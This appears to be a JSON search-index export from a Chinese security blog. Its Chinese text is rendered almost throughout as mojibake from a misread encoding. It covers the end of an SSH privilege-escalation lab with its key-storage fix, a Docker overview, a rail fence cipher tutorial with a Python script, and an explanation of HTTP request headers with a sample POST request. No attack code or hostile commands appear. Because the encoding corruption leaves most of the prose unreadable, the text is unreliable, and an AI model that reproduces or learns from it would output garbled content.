‡ä¸»æœºï¼Œè¿›è¡Œåç»­å†…ç½‘æ¸—é€ å››ã€è§£å†³æ–¹æ³• ä¸è¦å°†å¯†é’¥æ”¾åˆ°webç›®å½•ä¸‹ å°†å¯†é’¥æ”¾åœ¨åˆ«äººå­—å…¸æ‰«ä¸åˆ°çš„ç›®å½•ä¸‹","categories":[{"name":"ç»¼åˆé¶åœº","slug":"ç»¼åˆé¶åœº","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"ææƒ","slug":"ææƒ","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"},{"name":"SSH","slug":"SSH","permalink":"https://wolke.cn/tags/SSH/"}],"author":"w01ke"},{"title":"Dockeræ¦‚è¿°","slug":"Dockeræ¦‚è¿°","date":"2021-12-06T11:09:18.000Z","updated":"2022-01-03T03:26:08.467Z","comments":true,"path":"post/fb618b33.html","link":"","permalink":"https://wolke.cn/post/fb618b33.html","excerpt":"","text":"ä¸€ã€Dockerä¸ºä»€ä¹ˆä¼šå‡ºç°&emsp;&emsp;ä¸€æ¬¾äº§å“ï¼šå¼€å‘ğŸ‘‰ä¸Šçº¿ ç»å¸¸éœ€è¦ä¸¤å¥—ç¯å¢ƒï¼éœ€è¦å¯¹å…¶è¿›è¡Œéƒ¨ç½²åº”ç”¨ç¯å¢ƒå’Œåº”ç”¨é…ç½®ã€‚é‚£ä¹ˆå°±æœ‰äº†å¼€å‘äººå‘˜å’Œè¿ç»´äººå‘˜ &emsp;&emsp;é—®é¢˜ï¼šæˆ‘åœ¨æˆ‘çš„ç”µè„‘ä¸Šå¯ä»¥è¿è¡Œï¼ä½†æ˜¯åœ¨ä½ çš„ç”µè„‘å°±ä¸èƒ½è¿è¡Œï¼æˆ–è€…ç‰ˆæœ¬æ›´æ–°ï¼Œå¯¼è‡´æœåŠ¡ä¸å¯ç”¨ï¼å¯¹äºè¿ç»´æ¥è¯´ï¼Œè€ƒéªŒå°±ååˆ†å¤§ï¼Œç¯å¢ƒé…ç½®æ˜¯ååˆ†çš„éº»çƒ¦ï¼Œæ¯ä¸€ä¸ªæœºå™¨éƒ½è¦éƒ¨ç½²ç¯å¢ƒï¼ˆé›†ç¾¤Redisã€ESã€Hadoopï¼‰ï¼è´¹æ—¶è´¹åŠ›ã€‚å‘å¸ƒä¸€ä¸ªé¡¹ç›®ï¼ˆjar+ï¼ˆRedis MySQL jdk ESï¼‰ï¼‰ï¼Œé¡¹ç›®èƒ½ä¸èƒ½éƒ½å¸¦ä¸Šç¯å¢ƒå®‰è£…æ‰“åŒ…ï¼Ÿ &emsp;&emsp;Dockerçš„æ€æƒ³å°±æ¥è‡ªäºé›†è£…ç®± &emsp;&emsp;éš”ç¦»ï¼šDockeræ ¸å¿ƒæ€æƒ³ï¼æ‰“åŒ…è£…ç®±ï¼æ¯ä¸ªç®±å­éƒ½æ˜¯äº’ç›¸éš”ç¦»çš„ã€‚åˆ©ç”¨éš”ç¦»æœºåˆ¶å¯ä»¥å°†æœåŠ¡å™¨åˆ©ç”¨åˆ°æè‡´ï¼æ¯”å¦‚å¤šä¸ªåº”ç”¨éƒ½æ˜¯éƒ½æ˜¯äº¤å‰çš„ï¼Œå¯èƒ½ä¼šæœ‰ç«¯å£å†²çªï¼Œå¦‚æœä½¿ç”¨äº†Dockerå°±ä¼šéš”ç¦»èµ·æ¥ï¼Œä¸ä¼šé€ æˆç«¯å£å†²çª &emsp;&emsp;æœ¬è´¨ï¼šæ‰€æœ‰çš„æŠ€æœ¯éƒ½æ˜¯å› ä¸ºå‡ºç°äº†ä¸€äº›é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦å»è§£å†³ï¼Œæ‰å»å­¦ä¹ ï¼ äºŒã€Dockerçš„å†å²&emsp;&emsp;2010å¹´ï¼Œå‡ ä¸ªæITçš„å¹´è½»äººï¼Œå°±åœ¨ç¾å›½æˆç«‹äº†ä¸€å®¶å…¬å¸ dotCloud ï¼Œåšä¸€äº›paasçš„äº‘è®¡ç®—æœåŠ¡ï¼LXCï¼ˆè™šæ‹Ÿæœºï¼‰æœ‰å…³çš„å®¹å™¨æŠ€æœ¯ï¼ä»–ä»¬å°†è‡ªå·±çš„æŠ€æœ¯ï¼ˆå®¹å™¨åŒ–æŠ€æœ¯ï¼‰å‘½åå°±æ˜¯Dockerï¼ &emsp;&emsp;Dockeråˆšåˆšè¯ç”Ÿçš„æ—¶å€™ï¼Œæ²¡æœ‰å¼•èµ·è¡Œä¸šçš„æ³¨æ„ã€‚dotCloudå°±æ´»ä¸ä¸‹å»ï¼Œäºæ˜¯æå‡ºäº†å¼€æºï¼ˆå¼€æ”¾æºä»£ç ï¼‰ï¼Œ2013å¹´ï¼ŒDockerå¼€æºã€‚è¶Šæ¥è¶Šå¤šäººå‘ç°äº†Dockerçš„ä¼˜ç‚¹ï¼Œäºæ˜¯Dockerç«äº†ï¼ŒDockeræ¯ä¸ªæœˆéƒ½ä¼šæ›´æ–°ä¸€ä¸ªç‰ˆæœ¬ &emsp;&emsp;2014å¹´4æœˆ9æ—¥ï¼ŒDocker1.0å‘å¸ƒ &emsp;&emsp;Dockerä¸ºä»€ä¹ˆè¿™ä¹ˆç«ï¼Œå› ä¸ºå®ƒååˆ†çš„è½»å·§ã€‚åœ¨å®¹å™¨æŠ€æœ¯å‡ºç°ä¹‹å‰ï¼Œæˆ‘ä»¬éƒ½æ˜¯ä½¿ç”¨è™šæ‹ŸæœºæŠ€æœ¯ï¼Œè™šæ‹Ÿæœºä¹Ÿæ˜¯è™šæ‹ŸåŒ–æŠ€æœ¯ï¼ŒDockerå®¹å™¨æŠ€æœ¯ï¼Œä¹Ÿæ˜¯ä¸€ç§è™šæ‹ŸåŒ–æŠ€æœ¯ VMï¼šLinux CentosåŸç”Ÿé•œåƒï¼ˆä¸€ä¸ªç”µè„‘ï¼ï¼‰éš”ç¦»ï¼Œéœ€è¦å¼€å¯å¤šä¸ªè™šæ‹Ÿæœº å‡ ä¸ªG å‡ åˆ†é’ŸDockerï¼šéš”ç¦»ï¼Œé•œåƒï¼ˆæœ€æ ¸å¿ƒçš„ç¯å¢ƒ 4m + jdk + mysqlï¼‰ååˆ†çš„å°å·§ï¼Œè¿è¡Œé•œåƒå°±å¯ä»¥äº†ï¼å°å·§ï¼å‡ ä¸ªM KB ç§’çº§å¯åŠ¨ &emsp;&emsp;åˆ°ç°åœ¨ï¼Œæ‰€æœ‰å¼€å‘äººå‘˜éƒ½å¿…é¡»å­¦ä¼šDockerï¼ &emsp;&emsp;Dockeræ˜¯åŸºäºGoè¯­è¨€å¼€å‘çš„ï¼å¼€æºé¡¹ç›®ï¼ &emsp;&emsp;å®˜ç½‘ï¼šhttps://www.docker.com/ &emsp;&emsp;æ–‡æ¡£åœ°å€ï¼šhttps://docs.docker.com/ Dockerçš„æ–‡æ¡£æ˜¯è¶…çº§è¯¦ç»†çš„ï¼ &emsp;&emsp;ä»“åº“åœ°å€ï¼šhttps://hub.docker.com/ ä¸‰ã€Dockerèƒ½åšä»€ä¹ˆ3.1 è™šæ‹ŸæœºæŠ€æœ¯ &emsp;&emsp;è™šæ‹ŸæœºæŠ€æœ¯ç¼ºç‚¹ï¼š èµ„æºå ç”¨ååˆ†å¤š å†—ä½™æ­¥éª¤å¤š å¯åŠ¨å¾ˆæ…¢ 3.2 å®¹å™¨åŒ–æŠ€æœ¯&emsp;&emsp;å®¹å™¨åŒ–æŠ€æœ¯ä¸æ˜¯æ¨¡æ‹Ÿçš„ä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿ 3.3 ä¸åŒç‚¹ ä¼ ç»Ÿè™šæ‹Ÿæœºï¼Œè™šæ‹Ÿå‡ºä¸€æ¡ç¡¬ä»¶ï¼Œè¿è¡Œä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿï¼Œç„¶ååœ¨è¿™ä¸ªç³»ç»Ÿä¸Šå®‰è£…å’Œè¿è¡Œè½¯ä»¶ å®¹å™¨å†…çš„åº”ç”¨ç›´æ¥è¿è¡Œåœ¨å®¿ä¸»æœºçš„å†…å®¹ï¼Œå®¹å™¨æ˜¯æ²¡æœ‰è‡ªå·±çš„å†…æ ¸çš„ï¼Œä¹Ÿæ²¡æœ‰è™šæ‹Ÿæˆ‘ä»¬çš„ç¡¬ä»¶ï¼Œæ‰€ä»¥å°±è½»ä¾¿äº†ã€‚ æ¯ä¸ªå®¹å™¨æ˜¯äº’ç›¸éš”ç¦»çš„ï¼Œæ¯ä¸ªå®¹å™¨å†…éƒ½æœ‰ä¸€ä¸ªå±äºè‡ªå·±çš„æ–‡ä»¶ç³»ç»Ÿï¼Œäº’ä¸å½±å“ å››ã€DevOpsï¼ˆå¼€å‘ã€è¿ç»´ï¼‰ åº”ç”¨æ›´å¿«é€Ÿçš„äº¤ä»˜å’Œéƒ¨ç½² ä¼ ç»Ÿï¼šä¸€å †å¸®åŠ©æ–‡æ¡£ï¼Œå®‰è£…ç¨‹åº Dockerï¼šæ‰“åŒ…é•œåƒå‘å¸ƒæµ‹è¯•ï¼Œä¸€é”®è¿è¡Œ æ›´ä¾¿æ·çš„å‡çº§å’Œæ‰©ç¼©å®¹ ä½¿ç”¨äº†Dockeråï¼Œæˆ‘ä»¬éƒ¨ç½²åº”ç”¨å°±å’Œæ­ç§¯æœ¨ä¸€æ ·ï¼ é¡¹ç›®æ‰“åŒ…ä¸ºä¸€ä¸ªé•œåƒï¼Œæ‰©å±• æœåŠ¡å™¨Aï¼æœåŠ¡å™¨B æ›´ç®€å•çš„ç³»ç»Ÿè¿ç»´ åœ¨å®¹å™¨åŒ–ä¹‹åï¼Œæˆ‘ä»¬çš„å¼€å‘å’Œæµ‹è¯•ç¯å¢ƒéƒ½æ˜¯é«˜åº¦ä¸€è‡´çš„ æ›´é«˜æ•ˆçš„è®¡ç®—èµ„æºåˆ©ç”¨ Dockeræ˜¯å†…æ ¸çº§åˆ«çš„è™šæ‹ŸåŒ–ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªç‰©ç†æœºä¸Šå¯ä»¥è¿è¡Œå¾ˆå¤šçš„å®¹å™¨ç¤ºä¾‹ï¼æœåŠ¡å™¨çš„æ€§èƒ½å¯ä»¥è¢«åˆ©ç”¨åˆ°æè‡´ 1æ ¸2Gçš„æœåŠ¡å™¨èƒ½è¿è¡Œå¾ˆå¤šæœåŠ¡ï¼","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"æ …æ å¯†ç ","slug":"æ …æ å¯†ç ","date":"2021-12-06T10:54:44.000Z","updated":"2023-01-05T02:30:31.847Z","comments":true,"path":"post/54ca3f77.html","link":"","permalink":"https://wolke.cn/post/54ca3f77.html","excerpt":"","text":"ä¸€ã€ä»‹ç»&emsp;&emsp;The rail fence cipherï¼Œæ‰€è°“æ …æ å¯†ç ï¼Œå°±æ˜¯æŠŠè¦åŠ å¯†çš„æ˜æ–‡åˆ†æˆNä¸ªä¸€ç»„ï¼Œç„¶åæŠŠæ¯ç»„çš„ç¬¬1ä¸ªå­—è¿èµ·æ¥ï¼Œå½¢æˆä¸€æ®µæ— è§„å¾‹çš„è¯ã€‚ ä¸è¿‡æ …æ å¯†ç æœ¬èº«æœ‰ä¸€ä¸ªæ½œè§„åˆ™ï¼Œå°±æ˜¯ç»„æˆæ …æ çš„å­—æ¯ä¸€èˆ¬ä¸ä¼šå¤ªå¤šã€‚ï¼ˆä¸€èˆ¬ä¸è¶…è¿‡30ä¸ªï¼Œä¹Ÿå°±æ˜¯ä¸€ã€ä¸¤å¥è¯ï¼‰ äºŒã€åŠ å¯†åŸç† æŠŠå°†è¦ä¼ é€’çš„ä¿¡æ¯ä¸­çš„å­—æ¯äº¤æ›¿æ’æˆä¸Šä¸‹ä¸¤è¡Œã€‚ å†å°†ä¸‹é¢ä¸€è¡Œå­—æ¯æ’åœ¨ä¸Šé¢ä¸€è¡Œçš„åè¾¹ï¼Œä»è€Œå½¢æˆä¸€æ®µå¯†ç ã€‚ ä¸‰ã€ä¾‹å­&emsp;&emsp;æŠŠå°†è¦ä¼ é€’çš„ä¿¡æ¯ä¸­çš„å­—æ¯äº¤æ›¿æ’æˆä¸Šä¸‹ä¸¤è¡Œã€‚ T E O G S D Y U T A E N NH L N E T A M S H V A E D &emsp;&emsp;å¯†æ–‡ï¼šå°†ä¸‹é¢ä¸€è¡Œå­—æ¯æ’åœ¨ä¸Šé¢ä¸€è¡Œçš„åè¾¹ã€‚ TEOGSDYUTAENN HLNETAMSHVAED &emsp;&emsp;è§£å¯†ï¼šå…ˆå°†å¯†æ–‡åˆ†ä¸ºä¸¤è¡Œ T E O G S D Y U T A E N NH L N E T A M S H V A E D &emsp;&emsp;å†æŒ‰ä¸Šä¸‹ä¸Šä¸‹çš„é¡ºåºç»„åˆæˆä¸€å¥è¯ &emsp;&emsp;æ˜æ–‡ï¼š THE LONGEST DAY MUST HAVE AN END å››ã€æ‰©å±•ï¼ˆ1ï¼‰åœ¨é€‰æ‹©è¡Œæ•°æ—¶å¯ä»¥ä½¿ç”¨å¤šè¡Œï¼Œè¿™æ ·å¯¹äºåŠ å¯†å¼ºåº¦æœ‰æ‰€æé«˜ã€‚ ï¼ˆ2ï¼‰å¯ä»¥åœ¨åŠ å¯†ä¹‹ååœ¨ä½¿ç”¨å…¶ä»–å¯†ç è¿›è¡ŒåŠ å¯†ï¼Œå¢åŠ å¼ºåº¦ã€‚ äº”ã€Pythonå®ç°function = input(&quot;Input e to encrypt or d to decrypt:&quot;)function = function.upper()if function == &#x27;E&#x27;: encrypt_message = &quot;&quot; message = input(&quot;Please input your message:&quot;) message_length = len(message) fence_number = int(input(&quot;Please input your fence number:&quot;)) # å‡å¦‚è¾“å…¥ä¸º2 # åˆ›å»ºå…¨å±€ç©ºåˆ—è¡¨ã€‚encrypt_message_list0 = [],encrypt_message_list1 = [] for i in range(fence_number): s = &#x27;encrypt_message_list&#x27; + str(i) vars()[s] = [] # å°†å­—ç¬¦ä¸²çš„å­—ç¬¦åŠ å…¥åˆ—è¡¨ for i in range(message_length): remainder = i % fence_number # ä½™æ•° s = &#x27;encrypt_message_list&#x27; + str(remainder) # ä½™æ•°ä¸º0æ”¾ç¬¬ä¸€è¡Œå³encrypt_message_list0ï¼Œä½™æ•°ä¸º1æ”¾ç¬¬äºŒè¡Œå³encrypt_message_list1 vars()[s].append(message[i]) # æ‰“å°åŠ å¯†ä¿¡æ¯ for i in range(fence_number): s = &#x27;encrypt_message_list&#x27; + str(i) print((vars()[s])) encrypt_message = encrypt_message + &quot;&quot;.join(vars()[s]) print(f&quot;æ …æ æ•°ä¸º&#123;fence_number&#125;çš„åŠ å¯†ç»“æœä¸º: &#123;encrypt_message&#125;&quot;)elif function == &#x27;D&#x27;: encrypt_message = input(&quot;Please input your encrypt_message:&quot;) encrypt_message_length = len(encrypt_message) print(&quot;æ‰¹é‡è§£å¯†ç»“æœå¦‚ä¸‹: &quot;) for fence_number in range(2, encrypt_message_length, 1): # å¯èƒ½çš„æ …æ æ•°ï¼Œå°±ä¸è€ƒè™‘é•¿åº¦ä¸º1å’Œå¯†æ–‡é•¿åº¦çš„æ …æ æ•°äº† decrypt_message_list = [] encrypt_message_list = list(encrypt_message) # åŸºæœ¬åˆ—è¡¨å¤§å°ï¼Œå³å­—ç¬¦ä¸²å¤§å°é™¤ä»¥æ …æ æ•°ç›®ï¼Œå‘ä¸‹å–æ•´ basic_list_size = int(encrypt_message_length / fence_number) # å­—ç¬¦ä¸²å¤§å°é™¤ä»¥æ …æ æ•°ç›®å–ä½™ï¼Œåé¢æ ¹æ®ä½™æ•°ç¡®å®šæ¯ä¸ªåˆ—è¡¨æœ€ç»ˆå¤§å° remainder = encrypt_message_length % fence_number # åˆ›å»ºå…¨å±€åˆ—è¡¨å’Œå…¨å±€åˆ—è¡¨çš„é•¿åº¦ï¼Œå¹¶æŒ‰ç…§æ¯ä¸ªåˆ—è¡¨çš„é•¿åº¦ä¾æ¬¡å°†å¯†æ–‡æ”¾åˆ°åˆ—è¡¨ä¸­ for i in range(fence_number): s = &#x27;decrypt_message_list&#x27; + str(i) l = &#x27;decrypt_message_list_length&#x27; + str(i) if remainder == 0: vars()[l] = basic_list_size else: vars()[l] = basic_list_size + 1 remainder -= 1 vars()[s] = encrypt_message_list[0:vars()[l]] del(encrypt_message_list[0:vars()[l]]) # æŒ‰ç…§ä»ä¸Šåˆ°ä¸‹ï¼Œä»å·¦åˆ°å³çš„é¡ºåºå°†åˆ—è¡¨ä¸­çš„å…ƒç´ æ‹¼æ¥æˆå­—ç¬¦ä¸² for column in range(basic_list_size + 1): for row in range(fence_number): s = &#x27;decrypt_message_list&#x27; + str(row) l = &#x27;decrypt_message_list_length&#x27; + str(row) if column &lt; vars()[l]: decrypt_message_list.append(vars()[s][column]) else: pass # æ‰“å°è§£å¯†å­—ç¬¦ä¸² print(f&quot;æ …æ æ•°ä¸º&#123;fence_number&#125;çš„è§£å¯†ç»“æœä¸º&#123;&#x27;&#x27;.join(decrypt_message_list)&#125;&quot;)else: print(&quot;Input Error!&quot;)","categories":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://wolke.cn/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://wolke.cn/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"å¤å…¸å¯†ç ","slug":"å¤å…¸å¯†ç ","permalink":"https://wolke.cn/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"}],"author":"w01ke"},{"title":"Webæ•°æ®åŒ…æ‹“å±•","slug":"Webæ•°æ®åŒ…æ‹“å±•","date":"2021-12-03T13:59:38.000Z","updated":"2022-01-03T03:30:36.132Z","comments":true,"path":"post/488cc6a6.html","link":"","permalink":"https://wolke.cn/post/488cc6a6.html","excerpt":"","text":"ä¸€ã€ç½‘ç«™è§£æå¯¹åº”&emsp;&emsp;æ¶‰åŠåˆ°çš„æ”»å‡»å±‚é¢ï¼Ÿï¼ˆæºç ï¼Œæ­å»ºå¹³å°ï¼Œç³»ç»Ÿï¼Œç½‘ç»œå±‚ç­‰ï¼‰ &emsp;&emsp;æ¶‰åŠåˆ°çš„å®‰å…¨é—®é¢˜ï¼Ÿï¼ˆç›®å½•ï¼Œæ•æ„Ÿæ–‡ä»¶ï¼Œå¼±å£ä»¤ï¼ŒIP åŠåŸŸåç­‰ï¼‰ äºŒã€HTTP/HTTPSæ•°æ®åŒ… ä¸‰ã€HTTP/HTTPSå…·ä½“åŒºåˆ«3.1 HTTPç®€è¦é€šä¿¡è¿‡ç¨‹&emsp;&emsp;å»ºç«‹è¿æ¥â€“&gt;å‘é€è¯·æ±‚æ•°æ®åŒ…â€“&gt;è¿”å›ç›¸åº”æ•°æ®åŒ…â€“&gt;å…³é—­è¿æ¥ æµè§ˆå™¨å»ºç«‹ä¸WebæœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥ æµè§ˆå™¨å°†è¯·æ±‚æ•°æ®æ‰“åŒ…ï¼ˆç”Ÿæˆè¯·æ±‚æ•°æ®åŒ…ï¼‰å¹¶å‘é€åˆ°WebæœåŠ¡å™¨ WebæœåŠ¡å™¨å°†å¤„ç†ç»“æœæ‰“åŒ…ï¼ˆç”Ÿæˆç›¸åº”æ•°æ®åŒ…ï¼‰å¹¶å‘é€ç»™æµè§ˆå™¨ WebæœåŠ¡å™¨å…³é—­è¿æ¥ 3.2 HTTPSç®€è¦é€šä¿¡è¿‡ç¨‹ï¼ˆè§å›¾ï¼‰ å››ã€Requestè¯·æ±‚æ•°æ®åŒ…æ•°æ®æ ¼å¼ è¯·æ±‚è¡Œï¼šè¯·æ±‚ç±»å‹/è¯·æ±‚èµ„æºè·¯å¾„ã€ç‰ˆæœ¬çš„åè®®å’Œç±»å‹ è¯·æ±‚å¤´ï¼šä¸€äº›é”®å€¼å¯¹ï¼Œæµè§ˆå™¨ä¸WebæœåŠ¡å™¨ä¹‹é—´éƒ½å¯ä»¥å‘é€ï¼Œç‰¹å®šçš„æŸç§å«ä¹‰ ç©ºè¡Œï¼šè¯·æ±‚å¤´ä¸è¯·æ±‚ä½“ä¹‹é—´ç”¨ä¸€ä¸ªç©ºè¡Œéš”å¼€ è¯·æ±‚ä½“ï¼šè¦å‘é€çš„æ•°æ®ï¼ˆä¸€èˆ¬POSTæäº¤ä¼šä½¿ç”¨ï¼‰ï¼›ä¾‹ï¼šuser=123&amp;pas=123 ä¾‹ï¼š # Request HeadersPOST /adduser HTTP/1.1Host: localhost:8030Connection: keep-aliveContent-Length: 16Pragma: no-cacheCache-Control: no-cacheOrigin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcmUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/66.0.3359.181 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept: */*Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9# Form Dataname=name&amp;age=11 4.1 è¯·æ±‚è¡Œ&emsp;&emsp;è¯·æ±‚è¡Œç”±ä¸‰ä¸ªæ ‡è®°ç»„æˆï¼šè¯·æ±‚æ–¹æ³•ã€è¯·æ±‚ URL å’Œ HTTP ç‰ˆæœ¬ï¼Œå®ƒä»¬ç”¨ç©ºæ ¼åˆ†éš” &emsp;&emsp;ä¾‹å¦‚ï¼šGET /index.html HTTP/1.1 &emsp;&emsp;HTTPè§„åˆ’å®šä¹‰äº†8ç§å¯èƒ½çš„è¯·æ±‚æ–¹æ³•ï¼š GETï¼šæ£€ç´¢URLä¸­æ ‡è¯†èµ„æºçš„ä¸€ä¸ªç®€å•è¯·æ±‚HEADï¼šä¸GETæ–¹æ³•ç›¸åŒï¼ŒæœåŠ¡å™¨åªè¿”å›çŠ¶æ€è¡Œå’Œå¤´æ ‡ï¼Œå¹¶ä¸è¿”å›è¯·æ±‚æ–‡æ¡£POSTï¼šæœåŠ¡å™¨æ¥æ”¶è¢«å†™å…¥å®¢æˆ·ç«¯è¾“å‡ºæµä¸­çš„æ•°æ®çš„è¯·æ±‚PUTï¼šæœåŠ¡å™¨ä¿å­˜è¯·æ±‚æ•°æ®ä½œä¸ºæŒ‡å®šURLæ–°å†…å®¹çš„è¯·æ±‚DELETEï¼šæœåŠ¡å™¨åˆ é™¤URLä¸­å‘½ä»¤çš„èµ„æºçš„è¯·æ±‚OPTIONSï¼šå…³äºæœåŠ¡å™¨æ”¯æŒçš„è¯·æ±‚æ–¹æ³•ä¿¡æ¯çš„è¯·æ±‚TRACEï¼šWebæœåŠ¡å™¨åé¦ˆHTTPè¯·æ±‚å’Œå…¶å¤´æ ‡çš„è¯·æ±‚CONNECTï¼šå·²æ–‡æ¡£åŒ–ï¼Œä½†å½“å‰æœªå®ç°çš„ä¸€ä¸ªæ–¹æ³•ï¼Œé¢„ç•™åšéš§é“å¤„ç† 4.2 è¯·æ±‚å¤´ç”±å…³é”®å­—/å€¼å¯¹ç»„æˆï¼Œæ¯è¡Œä¸€å¯¹ï¼Œå…³é”®å­—å’Œå€¼ç”¨å†’å·åˆ†éš”ã€‚è¯·æ±‚å¤´æ ‡é€šçŸ¥æœåŠ¡å™¨è…¾äºå®¢æˆ·ç«¯çš„åŠŸèƒ½å’Œæ ‡è¯†ã€‚ HOST: ä¸»æœºæˆ–åŸŸååœ°å€ Acceptï¼šæŒ‡æµè§ˆå™¨æˆ–å…¶ä»–å®¢æˆ·å¯ä»¥æ¥å—çš„ MIME æ–‡ä»¶æ ¼å¼ã€‚Servlet å¯ä»¥æ ¹æ®å®ƒåˆ¤æ–­å¹¶è¿”å›é€‚å½“çš„æ–‡ä»¶æ ¼ å¼ã€‚ User-Agentï¼šæ˜¯å®¢æˆ·æµè§ˆå™¨åç§° Hostï¼šå¯¹åº”ç½‘å€ URL ä¸­çš„ Web åç§°å’Œç«¯å£å·ã€‚ Accept-Langeuageï¼šæŒ‡å‡ºæµè§ˆå™¨å¯ä»¥æ¥å—çš„è¯­è¨€ç§ç±»ï¼Œå¦‚ en æˆ– en-usï¼ŒæŒ‡è‹±è¯­ã€‚ Connectionï¼šç”¨æ¥å‘Šè¯‰æœåŠ¡å™¨æ˜¯å¦å¯ä»¥ç»´æŒå›ºå®šçš„ HTTP è¿æ¥ã€‚HTTP æ˜¯æ— è¿æ¥çš„ï¼ŒHTTP/1.1 ä½¿ç”¨ Keep-Alive ä¸ºé»˜è®¤å€¼ï¼Œè¿™æ ·ï¼Œå½“æµè§ˆå™¨éœ€è¦å¤šä¸ªæ–‡ä»¶æ—¶ï¼ˆæ¯”å¦‚ä¸€ä¸ª HTML æ–‡ä»¶å’Œç›¸å…³çš„å›¾å½¢æ–‡ä»¶ï¼‰ï¼Œä¸éœ€è¦æ¯æ¬¡éƒ½å»ºç«‹è¿æ¥ Cookieï¼šæµè§ˆå™¨ç”¨è¿™ä¸ªå±æ€§å‘æœåŠ¡å™¨å‘é€ Cookieã€‚Cookie æ˜¯åœ¨æµè§ˆå™¨ä¸­å¯„å­˜çš„å°å‹æ•°æ®ä½“ï¼Œå®ƒå¯ä»¥è®°è½½å’ŒæœåŠ¡å™¨ç›¸å…³çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥å®ç°ä¼šè¯åŠŸèƒ½ã€‚ X-Forwarded-Forï¼šæ˜¯ç”¨äºè®°å½•ä»£ç†ä¿¡æ¯çš„ï¼Œæ¯ç»è¿‡ä¸€çº§ä»£ç†(åŒ¿åä»£ç†é™¤å¤–)ï¼Œä»£ç†æœåŠ¡å™¨éƒ½ä¼šæŠŠè¿™æ¬¡è¯·æ±‚çš„æ¥æºIPè¿½åŠ åœ¨X-Forwarded-Forä¸­ X-Real-IPï¼šä¸€èˆ¬åªè®°å½•çœŸå®å‘å‡ºè¯·æ±‚çš„å®¢æˆ·ç«¯IP Refererï¼šè¡¨æ˜äº§ç”Ÿè¯·æ±‚çš„ç½‘é¡µURLã€‚å¦‚æ¯”ä»ç½‘é¡µ /icconcept/index.jsp ä¸­ç‚¹å‡»ä¸€ä¸ªé“¾æ¥åˆ°ç½‘é¡µ /icwork/search ï¼Œåœ¨å‘æœåŠ¡å™¨å‘é€çš„ GET /icwork/search ä¸­çš„è¯·æ±‚ä¸­ï¼ŒRefereræ˜¯ http://hostname:8080/icconcept/index.jsp ï¼Œè¿™ä¸ªå±æ€§å¯ä»¥ç”¨æ¥è·Ÿè¸ªWebè¯·æ±‚æ˜¯ä»ä»€ä¹ˆç½‘ç«™æ¥çš„ã€‚ï¼ˆæ¯”å¦‚ä¸€äº›é‚€è¯·é“¾æ¥å°±æ˜¯é€šè¿‡Refererå¤´æ¥åˆ¤åˆ«èµ°çš„æ˜¯è°çš„é‚€è¯·ï¼Œè´­ä¹°äº†ä»€ä¹ˆå•†å“ï¼Œå¯¹é‚€è¯·äººè¿›è¡Œå¥–åŠ±ï¼‰ Content-Typeï¼šç”¨æ¥è¡¨æ˜ Request çš„å†…å®¹ç±»å‹ã€‚å¯ä»¥ç”¨ HttpServletRequest çš„ getContentType()æ–¹æ³•å–å¾—ã€‚ Accept-Charsetï¼šæŒ‡å‡ºæµè§ˆå™¨å¯ä»¥æ¥å—çš„å­—ç¬¦ç¼–ç ã€‚è‹±æ–‡æµè§ˆå™¨çš„é»˜è®¤å€¼æ˜¯ ISO-8859-1. Accept-Encodingï¼šæŒ‡å‡ºæµè§ˆå™¨å¯ä»¥æ¥å—çš„ç¼–ç æ–¹å¼ã€‚ç¼–ç æ–¹å¼ä¸åŒäºæ–‡ä»¶æ ¼å¼ï¼Œå®ƒæ˜¯ä¸ºäº†å‹ç¼©æ–‡ä»¶å¹¶åŠ é€Ÿæ–‡ä»¶ä¼ é€’é€Ÿåº¦ã€‚æµè§ˆå™¨åœ¨æ¥æ”¶åˆ° Web å“åº”ä¹‹åå…ˆè§£ç ï¼Œç„¶åå†æ£€æŸ¥æ–‡ä»¶æ ¼å¼ã€‚ ç©ºè¡Œï¼šæœ€åä¸€ä¸ªè¯·æ±‚å¤´æ ‡ä¹‹åæ˜¯ç©ºè¡Œï¼Œå‘é€å›è½¦ç¬¦å’Œé€€è¡Œï¼Œé€šçŸ¥æœåŠ¡å™¨ä»¥ä¸‹ä¸å†æœ‰å¤´æ ‡ã€‚ è¯·æ±‚æ•°æ®ï¼šä½¿ç”¨ POST ä¼ é€ï¼Œæœ€å¸¸ä½¿ç”¨çš„æ˜¯ Content-Type å’Œ Content-Length å¤´æ ‡ã€‚ äº”ã€Responesè¿”å›æ•°æ®åŒ…æ•°æ®æ ¼å¼â€‹ ä¸€ä¸ªå“åº”ç”±å››ä¸ªéƒ¨åˆ†ç»„æˆï¼šçŠ¶æ€è¡Œã€å“åº”å¤´æ ‡ã€ç©ºè¡Œã€å“åº”æ•°æ®ã€‚ çŠ¶æ€è¡Œï¼šåè®®ç‰ˆæœ¬ã€æ•°å­—å½¢å¼çš„çŠ¶æ€ä»£ç å’ŒçŠ¶æ€æè¿°ï¼Œæ¯ä¸ªå…ƒç´ ä¹‹é—´ä»¥ç©ºæ ¼åˆ†éš” å“åº”å¤´æ ‡ï¼šåŒ…å«æœåŠ¡å™¨ç±»å‹ã€æ—¥æœŸã€é•¿åº¦ã€å†…å®¹ç±»å‹ç­‰ 